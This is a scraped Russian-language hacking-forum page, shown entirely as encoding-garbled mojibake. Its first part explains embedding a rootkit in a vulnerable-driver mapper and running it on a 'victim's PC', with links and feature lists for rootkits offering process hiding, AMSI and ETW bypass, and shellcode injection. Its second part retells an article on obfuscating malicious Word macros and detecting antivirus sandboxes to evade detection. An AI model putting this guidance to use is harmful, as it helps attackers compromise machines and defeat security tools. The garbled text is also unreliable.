–î–∞–Ω–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã —Ä–∞–±–æ—Ç–∞—é—Ç –∫–∞–∫ –Ω–∞ Win10, —Ç–∞–∫ –∏ –Ω–∞ Win11 (–¥—É–º–∞—é –Ω–∞ –û–° –≤–µ—Ä—Å–∏–∏ –Ω–∏–∂–µ –æ–Ω–∏ —Ç–æ–∂–µ –¥–æ–ª–∂–Ω—ã —Ä–∞–±–æ—Ç–∞—Ç—å).<br />
–ü–æ—Å–ª–µ —Ç–æ–≥–æ –∫–∞–∫ —É –≤–∞—Å –µ—Å—Ç—å RootKit, –≤—ã –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –µ–≥–æ –≤ –±–∞–π—Ç—ã —Å –ø–æ–º–æ—â—å—é HxD, —á—Ç–æ –±—ã –≤—Å—Ç–∞–≤–∏—Ç—å –ø—Ä—è–º –≤ –º–∞–ø–ø–µ—Ä –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795800440.png"
		data-src="https://osint42.org/attachments/1746795800440-png.318/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795800440-png.318/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795800440.png"
			title="1746795800440.png"
			width="575" height="682" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795808057.png"
		data-src="https://osint42.org/attachments/1746795808057-png.319/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795808057-png.319/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795808057.png"
			title="1746795808057.png"
			width="643" height="676" loading="lazy" />
	</div><br />
<br />
1 —Å–∫—Ä–∏–Ω—à–æ—Ç –µ—Å–ª–∏ –Ω–µ –æ—à–∏–±–∞—é—Å—å, —ç—Ç–æ —É—è–∑–≤–∏–º—ã–π –¥—Ä–∞–π–≤–µ—Ä, –∞ 2 –Ω–∞—à —Ä—É—Ç–∫–∏—Ç.<br />
–î–∞–ª–µ–µ –¥–æ–ø–∏—Å—ã–≤–∞–µ–º —Å—É—Ä—Å –º–∞–ø–ø–µ—Ä–∞ —Ç–∞–∫, —á—Ç–æ –±—ã –æ–Ω –¥—Ä–æ–ø–∞–ª –¥–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –≤ TEMP –ø–∞–ø–∫—É.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795873489.png"
		data-src="https://osint42.org/attachments/1746795873489-png.321/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795873489-png.321/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795873489.png"
			title="1746795873489.png"
			width="569" height="281" loading="lazy" />
	</div><br />
<br />
–ü–æ–ª—É—á–∞–µ—Ç—Å—è –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫–æ–µ.<br />
–î–∞–ª–µ–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–ø—É—Å–∫–∞–µ–º –Ω–∞ –ø–∫ –∂–µ—Ä—Ç–≤—ã –Ω–∞—à –º–∞–ø–ø–µ—Ä –∏ –æ–Ω —Å–¥–µ–ª–∞–µ—Ç –≤—Å—ë –æ—Å—Ç–∞–ª—å–Ω–æ–µ –∑–∞ –≤–∞—Å.<br />
<br />
–ù–∞ —ç—Ç–æ–º –≤—Å—ë, —è —É–ø—É—Å—Ç–∏–ª –º–Ω–æ–≥–æ –≤–µ—â–µ–π –≤ —Å—Ç–∞—Ç—å–µ, –Ω–æ –¥—É–º–∞—é –∫–æ–º—É –Ω–∞–¥–æ, —Ç–æ—Ç —Å–º–æ–∂–µ—Ç —Ä–∞–∑–æ–±—Ä–∞—Ç—å—Å—è –≤ —ç—Ç–æ–º.<br />
–í–æ–∑–º–æ–∂–Ω–æ –µ—Å–ª–∏ –±—É–¥–µ—Ç –∂–µ–ª–∞–Ω–∏–µ, —Ç–æ —è –Ω–∞–ø–∏—à—É 2 —á–∞—Å—Ç—å –ø–æ —Å–æ–∑–¥–∞–Ω–∏—é RootKit&#039;a, –Ω–æ —ç—Ç–æ –≤—Ä—è–¥-–ª–∏ –±—É–¥–µ—Ç —Å–∫–æ—Ä–æ, –∏–±–æ —è —Å–∞–º –Ω–µ —Å–æ–≤—Å–µ–º —Ä–∞–∑–±–∏—Ä–∞—é—Å—å –≤ —Å–æ–∑–¥–∞–Ω–∏–∏ –¥—Ä–∞–π–≤–µ—Ä–æ–≤ –∏ —ç—Ç–æ –±—ã–ª –º–æ–π –ø–µ—Ä–≤—ã–π –æ–ø—ã—Ç –≤ –Ω–∞–ø–∏—Å–∞–Ω–∏–∏ —Ä—É—Ç–∫–∏—Ç–æ–≤.<br />
<br />
–¢–∞–∫–∂–µ –µ—Å—Ç—å –≥–æ—Ç–æ–≤—ã–µ —Ä—É—Ç–∫–∏—Ç—ã –¥–ª—è –≤–∏–Ω–¥—ã, –Ω–∞–ø—Ä–∏–º–µ—Ä –≤–æ—Ç, —Å–ø–∏—Å–æ–∫:<br />
<br />
<div><a href="https://github.com/XaFF-XaFF/Cronos-Rootkit" target="_blank" class="link link--external" rel="noopener">https://github.com/XaFF-XaFF/Cronos-Rootkit</a></div><br />
<div><a href="https://github.com/ZeroMemoryEx/Chaos-Rootkit" target="_blank" class="link link--external" rel="noopener">https://github.com/ZeroMemoryEx/Chaos-Rootkit</a></div><br />
<div><a href="https://github.com/XaFF-XaFF/Black-Angel-Rootkit" target="_blank" class="link link--external" rel="noopener">https://github.com/XaFF-XaFF/Black-Angel-Rootkit</a></div><br />
–ü–æ—Å–ª–µ–¥–Ω–∏–π –∫—Å—Ç–∞—Ç–∏ –ø—Ä–∏–∫–æ–ª—å–Ω—ã–π, –≤–æ—Ç –µ–≥–æ —Ñ—É–Ω–∫—Ü–∏–∏:<br />
<ul>
<li data-xf-list-type="ul">DSE Bypass (No need to turn test signing on)</li>
<li data-xf-list-type="ul">KPP Bypass</li>
<li data-xf-list-type="ul">Hide processes</li>
<li data-xf-list-type="ul">Hide ports (TCP/UDP)</li>
<li data-xf-list-type="ul">Process permission elevation</li>
<li data-xf-list-type="ul">Process protection</li>
<li data-xf-list-type="ul">Shellcode injector (Unkillable shellcode. Even if process dies, shellcode can still run)</li>
<li data-xf-list-type="ul">(TODO) Hide files/directories</li>
<li data-xf-list-type="ul">(TODO) Hide registry keys</li>
</ul><b>–ê—Ö—Ä–µ–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Ä—É—Ç–∫–∏—Ç:<div><a href="https://github.com/Idov31/Nidhogg" target="_blank" class="link link--external" rel="noopener">https://github.com/Idov31/Nidhogg</a></div></b><ul>
<li data-xf-list-type="ul">Process hiding and unhiding</li>
<li data-xf-list-type="ul">Process elevation</li>
<li data-xf-list-type="ul">Process protection (anti-kill and dumping)</li>
<li data-xf-list-type="ul">Bypass pe-sieve</li>
<li data-xf-list-type="ul">Thread hiding</li>
<li data-xf-list-type="ul">Thread protection (anti-kill)</li>
<li data-xf-list-type="ul">File protection (anti-deletion and overwriting)</li>
<li data-xf-list-type="ul">File hiding</li>
<li data-xf-list-type="ul">Registry keys and values protection (anti-deletion and overwriting)</li>
<li data-xf-list-type="ul">Registry keys and values hiding</li>
<li data-xf-list-type="ul">Querying currently protected processes, threads, files, registry keys and values</li>
<li data-xf-list-type="ul">Arbitrary kernel R/W</li>
<li data-xf-list-type="ul">Function patching</li>
<li data-xf-list-type="ul">Built-in AMSI bypass</li>
<li data-xf-list-type="ul">Built-in ETW patch</li>
<li data-xf-list-type="ul">Process signature (PP/PPL) modification</li>
<li data-xf-list-type="ul">Can be reflectively loaded</li>
<li data-xf-list-type="ul">Shellcode Injection<ul>
<li data-xf-list-type="ul">APC</li>
<li data-xf-list-type="ul">NtCreateThreadEx</li>
</ul></li>
<li data-xf-list-type="ul">DLL Injection<ul>
<li data-xf-list-type="ul">APC</li>
<li data-xf-list-type="ul">NtCreateThreadEx</li>
</ul></li>
<li data-xf-list-type="ul">Querying kernel callbacks<ul>
<li data-xf-list-type="ul">ObCallbacks</li>
<li data-xf-list-type="ul">Process and thread creation routines</li>
<li data-xf-list-type="ul">Image loading routines</li>
<li data-xf-list-type="ul">Registry callbacks</li>
</ul></li>
<li data-xf-list-type="ul">Removing and restoring kernel callbacks</li>
<li data-xf-list-type="ul">ETWTI tampering</li>
</ul><br />
–í –∫–∞—á–µ—Å—Ç–≤–µ –¥–æ–ø–æ–ª–Ω–µ–Ω–∏—è –º–∞–ø–µ—Ä:<a href="https://github.com/TheCruZ/kdmapper" target="_blank" class="link link--external" rel="noopener">GitHub - TheCruZ/kdmapper: KDMapper is a simple tool that exploits iqvw64e.sys Intel driver to manually map non-signed drivers in memory</a><br />
<br />
–í–æ—Ç –µ—â—ë –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ —Å–≤–µ–∂–∏–π<br />
<div><a href="https://github.com/gmh5225/CallMeWin32kDriver" target="_blank" class="link link--external" rel="noopener">https://github.com/gmh5225/CallMeWin32kDriver</a></div><br />
–í–æ—Ç –µ—â—ë –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π —Å—ç–º–ø–ª —Å –∑–∞—â–∏—Ç–æ–π –ø—Ä–æ—Ü–µ—Å—Å–∞ –æ—Ç –∑–∞–∫—Ä—ã—Ç–∏—è<br />
<div><a href="https://github.com/AdvDebug/MineRootkit" target="_blank" class="link link--external" rel="noopener">https://github.com/AdvDebug/MineRootkit</a></div></div>
						

							<h2>–û–±—Ö–æ–¥ AMSI</h2>

							

							

							<div class="bbWrapper">–û—á–µ–Ω—å –ø–æ–∑–Ω–∞–≤–∞—Ç–µ–ª—å–Ω–∞—è —Å—Ç–∞—Ç—å—è —Å –•–∞–∫–µ—Ä–∞:<a href="https://xakep.ru/2022/07/15/macros-obfuscation" target="_blank" class="link link--external" rel="noopener">–û6—Ñy$k–∞—Ü–∏—è. –û–±—Ö–æ–¥–∏–º –¥–µ—Ç–µ–∫—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –º–∞–∫—Ä–æ—Å–æ–≤ Word</a><br />
<br />
<b><u>–ò —ç—Ç–æ –æ—Ç–≤–µ—Ç —Ç–µ–º, –∫—Ç–æ —Å—á–∏—Ç–∞–µ—Ç —á—Ç–æ —Å–∫—Ä–∏–ø—Ç–∞–º–∏ –Ω–µ–ª—å–∑—è –¥–µ–ª–∞—Ç—å –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–µ –≤–µ—â–∏, –º–æ–∂–Ω–æ –≤—Å—ë –ø—Ä–∏ –¥–æ–ª–∂–Ω–æ–º —É–º–µ–Ω–∏–∏ –∏ –∑–Ω–∞–Ω–∏–∏...)</u></b><br />
<br />
–ö–∞–∑–∞–ª–æ—Å—å –±—ã, –º–∞–∫—Ä–æ–≤–∏—Ä—É—Å—ã –¥–∞–≤–Ω–æ –∏ –±–µ–∑–≤–æ–∑–≤—Ä–∞—Ç–Ω–æ —É—à–ª–∏ –≤ –ø—Ä–æ—à–ª–æ–µ. –£–∂ —á—Ç–æ‚Äë—á—Ç–æ, –∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –º–∞–∫—Ä–æ—Å—ã –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ö Office —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –¥–æ–ª–∂–Ω—ã –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—Ç—å –ª–µ–≥–∫–æ –∏ –Ω–µ–ø—Ä–∏–Ω—É–∂–¥–µ–Ω–Ω–æ. –ò–º–µ–Ω–Ω–æ —Ç–∞–∫ –∏ –æ–±—Å—Ç–æ—è—Ç –¥–µ–ª–∞, –µ—Å–ª–∏ –º–∞–∫—Ä–æ—Å, –∫–æ–Ω–µ—á–Ω–æ, –Ω–µ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω. –≠—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º–∏ –ø—Ä–∏–µ–º–∞–º–∏ –æ–±—Ö–æ–¥–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–≥–æ –¥–µ—Ç–µ–∫—Ç–∞ –∑–ª–æ–≤—Ä–µ–¥–Ω—ã—Ö VBA-–º–∞–∫—Ä–æ—Å–æ–≤ –ø–æ–¥–µ–ª–∏–ª—Å—è –≤ —Å–≤–æ–µ–π –ø—É–±–ª–∏–∫–∞—Ü–∏–∏  –Ω–µ–∑–∞–≤–∏—Å–∏–º—ã–π –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å –ë—Ä–µ–Ω–¥–∞–Ω –û—Ä—Ç–∏–∑, –∞ –º—ã —Ä–∞—Å—Å–∫–∞–∂–µ–º –æ –µ–≥–æ –∏–∑—ã—Å–∫–∞–Ω–∏—è—Ö —Ç–µ–±–µ.<br />
<br />
–ì–æ—Ç–æ–≤—è—Å—å –∫ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ OSEP, –ë—Ä–µ–Ω–¥–∞–Ω –û—Ä—Ç–∏–∑ –Ω–∞–≤–µ—Ä–Ω—è–∫–∞ –≤—ã–ø–∏–ª –≤–µ–¥—Ä–æ –∫–æ—Ñ–µ –∏ –ø–µ—Ä–µ–ª–æ–ø–∞—Ç–∏–ª –≥–∏–≥–∞–±–∞–π—Ç—ã —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏. –ù–∞—Å—á–µ—Ç –∫–æ—Ñ–µ –º—ã –Ω–µ —É–≤–µ—Ä–µ–Ω—ã, –∞ –≤–æ—Ç —Ç–æ, —á—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º —ç—Ç–æ–π –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏ —Å—Ç–∞–ª–æ <a href="https://depthsecurity.com/blog/obfuscating-malicious-macro-enabled-word-docs" target="_blank" class="link link--external" rel="noopener">–º–∞—Å—à—Ç–∞–±–Ω–æ–µ –∏ –ø–æ–¥—Ä–æ–±–Ω–æ–µ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ —Å–ø–æ—Å–æ–±–æ–≤ –∑–∞–∫–ª–∞–¥–∫–∏ VBA-–º–∞–∫—Ä–æ—Å–æ–≤ –≤ —Å–∞–º—ã–µ –æ–±—ã—á–Ω—ã–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã Word</a>, –Ω–µ –ø–æ–¥–ª–µ–∂–∏—Ç –Ω–∏–∫–∞–∫–æ–º—É —Å–æ–º–Ω–µ–Ω–∏—é. –ë—Ä–µ–Ω–¥–∞–Ω —É–±–µ–¥–∏–ª—Å—è, —á—Ç–æ –Ω–∞ —Å–∞–π—Ç–µ <a href="http://antiscan.me/" target="_blank" class="link link--external" rel="noopener">antiscan.me</a> (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ <a href="http://virustotal.com/" target="_blank" class="link link--external" rel="noopener">virustotal.com</a>) –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π —Ñ–∞–π–ª –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–ª—Å—è –∫–∞–∫ –º–∏–Ω–∏–º—É–º 7 –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–º–∏ –¥–≤–∏–∂–∫–∞–º–∏ –∏–∑ 20. –¢–æ–≥–¥–∞ –æ–Ω –≤—Å–µ—Ä—å–µ–∑ –≤–∑—è–ª—Å—è –∑–∞ –æ–±—Ñ—É—Å–∫–∞—Ü–∏—é —Å–≤–æ–∏—Ö —Ö—É–¥–æ–∂–µ—Å—Ç–≤ –∏ —Å–º–æ–≥ –≤ –∏—Ç–æ–≥–µ —Å–±–∏—Ç—å –ø–æ–∫–∞–∑–∞—Ç–µ–ª—å –¥–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –¥–æ 2 –∏–∑ 20. –ü–æ—Å–∫–æ–ª—å–∫—É –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–µ –±–∞–∑—ã –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏ –æ–±–Ω–æ–≤–ª—è—é—Ç—Å—è, —Å–æ –≤—Ä–µ–º–µ–Ω–µ–º —ç—Ç–æ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä –≤—ã—Ä–æ—Å —Å 2 –¥–æ 5. –ù–æ –≤—Å–µ —Ä–∞–≤–Ω–æ ‚Äî —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–ª—É—á–∏–ª—Å—è –≤–ø–µ—á–∞—Ç–ª—è—é—â–∏–π.<br />
<br />




<blockquote data-attributes="" data-quote="" data-source=""
	class="bbCodeBlock bbCodeBlock--expandable bbCodeBlock--quote js-expandWatch">
	
	<div class="bbCodeBlock-content">
		
		<div class="bbCodeBlock-expandContent js-expandContent ">
			–í—Å—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –ø—Ä–∏–≤–æ–¥–∏—Ç—Å—è –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –≤ –æ–∑–Ω–∞–∫–æ–º–∏—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö, –∞–≤—Ç–æ—Ä –∏ —Ä–µ–¥–∞–∫—Ü–∏—è –Ω–µ –Ω–µ—Å—É—Ç –Ω–∏–∫–∞–∫–æ–π –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏ –∑–∞ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –ø—É–±–ª–∏–∫–∞—Ü–∏–∏. –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–∞–µ–º, —á—Ç–æ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –º–∞–∫—Ä–æ—Å–æ–≤ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ö Microsoft –Ω–∞ —Ç–≤–æ–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –º–æ–≥—É—Ç –±—ã—Ç—å —Å–ø—Ä–æ–≤–æ—Ü–∏—Ä–æ–≤–∞–Ω—ã –Ω–µ–∂–µ–ª–∞—Ç–µ–ª—å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è.
		</div>
		<div class="bbCodeBlock-expandLink js-expandLink"><a role="button" tabindex="0">–ù–∞–∂–º–∏—Ç–µ, —á—Ç–æ–±—ã —Ä–∞—Å–∫—Ä—ã—Ç—å...</a></div>
	</div>
</blockquote><br />
<b>–ü—Ä–æ–≤–µ—Ä–∫–∞ —ç–º—É–ª—è—Ü–∏–∏</b><br />
<br />
–ú–Ω–æ–≥–∏–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã, –∏—Å–ø–æ–ª—å–∑—É—é—â–∏–µ –¥–ª—è –¥–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–æ–≤ —ç–≤—Ä–∏—Å—Ç–∏–∫—É, –∑–∞–ø—É—Å–∫–∞—é—Ç VBA-—Å–∫—Ä–∏–ø—Ç—ã –≤ ¬´–ø–µ—Å–æ—á–Ω–∏—Ü–µ¬ª —Å —Ü–µ–ª—å—é —É–±–µ–¥–∏—Ç—å—Å—è –≤ –∏—Ö –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –ü–æ—Ç–æ–º—É –Ω–∞—Å—Ç–æ—è—â–∏–µ –≤–∏—Ä—É—Å–æ–ø–∏—Å–∞—Ç–µ–ª–∏ –≤ –ø–µ—Ä–≤—É—é –æ—á–µ—Ä–µ–¥—å –ø—Ä–æ–≤–µ—Ä—è—é—Ç, —Ä–∞–±–æ—Ç–∞–µ—Ç –ª–∏ –∏—Ö —Å—Ü–µ–Ω–∞—Ä–∏–π –≤ —ç–º—É–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥–µ, –∏, –µ—Å–ª–∏ —Ç–∞–∫ ‚Äî –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø–µ–π–ª–æ–∞–¥–∞, —á—Ç–æ–±—ã –∞–Ω—Ç–∏–≤–∏—Ä—É—Å –Ω–µ –∑–∞–±–∏–ª —Ç—Ä–µ–≤–æ–≥—É.<br />
<br />
–ë—Ä–µ–Ω–¥–∞–Ω –û—Ä—Ç–∏–∑ –ø—Ä–µ–¥–ª–æ–∂–∏–ª —Ç—Ä–∏ –ø—Ä–æ—Å—Ç—ã—Ö —Ç–µ—Å—Ç–∞ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —ç–º—É–ª—è—Ç–æ—Ä–∞. –≠—Ç–∏ —Ç–µ—Å—Ç—ã —Ä–∞—Å–ø–æ–ª–∞–≥–∞—é—Ç—Å—è –≤ —Å–∞–º–æ–º –Ω–∞—á–∞–ª–µ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –∏–º –º–∞–∫—Ä–æ—Å–∞ –∏ –Ω–µ –ø–æ–∑–≤–æ–ª—è—é—Ç –µ–º—É –≤—ã–ø–æ–ª–Ω–∏—Ç—å –Ω–∏–∫–∞–∫–∏—Ö –∑–ª–æ–≤—Ä–µ–¥–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π, –µ—Å–ª–∏ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—Å—è, —á—Ç–æ —Å–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="01.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26875%2F01.png&amp;hash=b50b0e1f38f2afbedc3d4e78dc0a03b2" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../01a461.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26875%2F01.png&amp;hash=b50b0e1f38f2afbedc3d4e78dc0a03b2"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26875/01.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="01.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–ü–µ—Ä–≤—ã–π —Ç–µ—Å—Ç –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∑–≤–∞–ª ¬´Document Name¬ª. –í–æ –º–Ω–æ–≥–∏—Ö —Å–ª—É—á–∞—è—Ö, –∫–æ–≥–¥–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–π –¥–≤–∏–∂–æ–∫ —ç–º—É–ª–∏—Ä—É–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –º–∞–∫—Ä–æ—Å–∞ VBA, –æ–Ω –º–µ–Ω—è–µ—Ç –∏–º—è –¥–æ–∫—É–º–µ–Ω—Ç–∞ –ª–∏–±–æ –¥–æ–±–∞–≤–ª—è–µ—Ç –∫ —ç—Ç–æ–º—É –∏–º–µ–Ω–∏ –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ —á–∏—Å–ª–æ, —á—Ç–æ–±—ã –æ—Ç—Å–ª–µ–¥–∏—Ç—å –∏ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –º–Ω–æ–≥–æ–∫—Ä–∞—Ç–Ω—ã–π –∑–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞. –≠—Ç–æ—Ç —Ç–µ—Å—Ç –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, —Å–æ–≤–ø–∞–¥–∞–µ—Ç –ª–∏ —Å –∏–º–µ–Ω–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –∏–º—è —Ç–æ–≥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –≤ –∫–æ—Ç–æ—Ä–æ–º –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞.<br />
<br />
–ß—Ç–æ–±—ã –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Å—Ç–∞—Ç–∏—á–µ—Å–∫—É—é —Å—Ç—Ä–æ–∫—É, –≤ –∫–æ—Ç–æ—Ä–æ–π —Ö—Ä–∞–Ω–∏—Ç—Å—è –∏–º—è –¥–æ–∫—É–º–µ–Ω—Ç–∞, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å—Ü–µ–Ω–∞—Ä–∏–π PowerShell, –∞ –∑–∞—Ç–µ–º –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è –µ–µ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è Joy. –ï—Å–ª–∏ –∏–º—è –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –Ω–µ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º –∏–º–µ–Ω–µ–º, –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å—á–∏—Ç–∞–µ—Ç—Å—è –Ω–µ–ø—Ä–æ–π–¥–µ–Ω–Ω–æ–π –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤—ã—Ö–æ–¥ –∏–∑ –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
–ù–∞ –≤—Ç–æ—Ä–æ–º —ç—Ç–∞–ø–µ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è –ø—É—Ç—å. –ï—Å–ª–∏ –º—ã –∑–∞—Ä–∞–Ω–µ–µ –∑–Ω–∞–µ–º, –∏–∑ –∫–∞–∫–æ–π –ø–∞–ø–∫–∏ –±—É–¥–µ—Ç –æ—Ç–∫—Ä—ã—Ç –¥–æ–∫—É–º–µ–Ω—Ç —Å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º —Å—Ü–µ–Ω–∞—Ä–∏–µ–º (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∏–∑ –ø–∞–ø–∫–∏ ¬´–ó–∞–≥—Ä—É–∑–∫–∏¬ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è Windows), —Ç–æ –º—ã –º–æ–∂–µ–º —Å—Ä–∞–≤–Ω–∏—Ç—å –µ–µ —Å —Ç–µ–∫—É—â–∏–º –ø—É—Ç–µ–º. –ù–µ—Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ –ø—É—Ç–∏ —É–∫–∞–∂–µ—Ç –Ω–∞ —Ç–æ, —á—Ç–æ —Å–∫—Ä–∏–ø—Ç, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–º –¥–≤–∏–∂–∫–µ. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –º—ã —Ç–∞–∫–∂–µ –≤—ã—Ö–æ–¥–∏–º –∏–∑ –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
